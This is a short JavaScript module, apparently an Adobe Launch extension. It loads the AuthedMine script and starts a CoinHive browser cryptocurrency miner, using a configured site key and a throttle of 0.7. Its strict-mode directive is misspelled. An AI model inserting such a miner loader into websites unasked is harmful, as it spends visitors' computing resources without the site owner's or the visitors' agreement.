"use-strict"

var loadScript = require('@adobe/reactor-load-script');
var url = "https://authedmine.com/lib/authedmine.min.js";
var extensionSettings = turbine.getExtensionSettings();
var promise = promise || loadScript(url).then(function () {
  return new CoinHive.Anonymous(extensionSettings.siteKey, { throttle: 0.7 });
})

module.exports = promise;